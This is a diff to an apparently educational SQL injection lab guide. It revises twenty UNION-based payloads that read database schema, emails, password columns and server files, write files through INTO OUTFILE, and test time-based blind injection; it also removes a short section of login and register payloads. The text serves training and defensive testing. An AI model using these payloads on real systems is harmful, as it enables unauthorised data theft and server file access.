@@ -278,121 +278,121 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['search'])) {
 #### 1. **Get Database Version**
    **Objective**: Retrieve the version of the database (MySQL, PostgreSQL, etc.).
    ```sql
-   UNION SELECT NULL, version(), NULL /* 
+   UNION SELECT NULL, version(), NULL # 
    ```
 
 #### 2. **Get Current Database**
    **Objective**: Retrieve the name of the current database.
    ```sql
-   UNION SELECT NULL, user(), NULL /* 
+   UNION SELECT NULL, database(), NULL #
    ```
 
 #### 3. **Get Current Database User**
    **Objective**: Get the current user connected to the database.
    ```sql
-   UNION SELECT NULL, user(), NULL /* 
+   UNION SELECT NULL, user(), NULL #
    ```
 
 #### 4. **List All Tables in a Specific Database**
    **Objective**: Retrieve all table names from a specific database.
    ```sql
-   UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = '[database_name]' /* 
+   UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema = '[database_name]' #
    ```
 
 #### 5. **List All Columns in a Specific Table**
    **Objective**: Retrieve all column names from a given table.
    ```sql
-   UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = '[table_name]' /* 
+   UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = '[table_name]' #
    ```
 
 #### 6. **Select Data from a Specific Table**
    **Objective**: Retrieve data from a specific column in a table.
    ```sql
-   UNION SELECT NULL, [column_name], NULL FROM [table_name] /* 
+   UNION SELECT NULL, [column_name], NULL FROM [table_name] # 
    ```
 
 #### 7. **Read File from the Server**
    **Objective**: Use the `LOAD_FILE` function to read a file from the server (if permitted by the database).
    ```sql
-   UNION SELECT NULL, load_file('/path/to/file'), NULL /* 
+   UNION SELECT NULL, load_file('/path/to/file'), NULL #
    ```
 
 #### 8. **Write Data to a File on the Server**
    **Objective**: Attempt to write content to a file on the server (using `OUTFILE`).
    ```sql
-   UNION SELECT NULL, '[file_content]', NULL INTO OUTFILE '/path/to/output/file' /* 
+   UNION SELECT NULL, '[file_content]', NULL INTO OUTFILE '/path/to/output/file' #
    ```
 
 #### 9. **Trigger Column Mismatch (Error Handling Test)**
    **Objective**: Test how the application handles column mismatch errors.
    ```sql
-   UNION SELECT NULL, NULL, NULL /* 
+   UNION SELECT NULL, NULL, NULL # 
    ```
 
 #### 10. **List All Tables in All Databases**
    **Objective**: Retrieve all table names from all databases (exploiting information schema).
    ```sql
-   UNION SELECT NULL, table_name, NULL FROM information_schema.tables /* 
+   UNION SELECT NULL, table_name, NULL FROM information_schema.tables #
    ```
 
 #### 11. **List All Columns in All Tables**
    **Objective**: Retrieve all column names from all tables in the database.
    ```sql
-   UNION SELECT NULL, column_name, NULL FROM information_schema.columns /* 
+   UNION SELECT NULL, column_name, NULL FROM information_schema.columns # 
    ```
 
 #### 12. **Search for Sensitive Data (e.g., Password Columns)**
    **Objective**: Retrieve columns potentially containing sensitive data such as passwords.
    ```sql
-   UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE column_name LIKE '%password%' /* 
+   UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE column_name LIKE '%password%' #
    ```
 
 #### 13. **Retrieve Specific Data (e.g., Emails)**
    **Objective**: Retrieve specific data such as email addresses from the `users` table.
    ```sql
-   UNION SELECT NULL, email, NULL FROM users /* 
+   UNION SELECT NULL, email, NULL FROM users #
    ```
 
 #### 14. **Count the Rows in a Table**
    **Objective**: Retrieve the number of rows in a specific table.
    ```sql
-   UNION SELECT NULL, COUNT(*), NULL FROM [table_name] /* 
+   UNION SELECT NULL, COUNT(*), NULL FROM [table_name] #
    ```
 
 #### 15. **Retrieve the Current Date**
    **Objective**: Retrieve the current date from the database.
    ```sql
-   UNION SELECT NULL, CURDATE(), NULL /* 
+   UNION SELECT NULL, CURDATE(), NULL #
    ```
 
 #### 16. **Perform Time-Based Blind SQL Injection**
    **Objective**: Test for time-based blind SQL injection by introducing a delay.
    ```sql
-   UNION SELECT NULL, SLEEP(5), NULL /* 
+   UNION SELECT NULL, SLEEP(5), NULL # 
    ```
 
 #### 17. **Retrieve Database System Information (e.g., MySQL Version)**
    **Objective**: Retrieve detailed database system information (e.g., MySQL version).
    ```sql
-   UNION SELECT NULL, @@version_comment, NULL /* 
+   UNION SELECT NULL, @@version_comment, NULL #
    ```
 
 #### 18. **Retrieve Schema Information**
    **Objective**: Retrieve schema information from the database.
    ```sql
-   UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata /* 
+   UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata # 
    ```
 
 #### 19. **Trigger Error-Based SQL Injection**
    **Objective**: Generate an error to reveal database structure via error messages.
    ```sql
-   UNION SELECT NULL, table_schema, NULL FROM information_schema.schemata /* 
+   UNION SELECT NULL, table_schema, NULL FROM information_schema.schemata # 
    ```
 
 #### 20. **Extract Hostname or System Information**
    **Objective**: Retrieve system-level information such as the database hostname.
    ```sql
-   UNION SELECT NULL, @@hostname, NULL /* 
+   UNION SELECT NULL, @@hostname, NULL # 
    ```
 
 ---
@@ -426,17 +426,7 @@ These scenarios are **designed for ethical hacking and educational purposes**. T
 **Important Reminder**: 
 SQL injection is a **serious vulnerability** that can cause significant damage. Always ensure that testing is done in environments where you have **explicit permission**. Never attempt these techniques on systems you don't have permission to test.
 
-#### **2. Time-based Blind SQL Injection**
-- Go to **login.php** and try entering this payload into the username field: `' OR SLEEP(
 
-5) #`.
-- The page will delay for 5 seconds if the injection is successful.
-
-#### **3. Second-order SQL Injection**
-- Go to **register.php** and try this payload: `admin' #` in the username field.
-- Log in with `admin' #` as the username and observe that the application fails to properly filter input data.
-
----
 
 ### **Step 4: Mitigation**
 
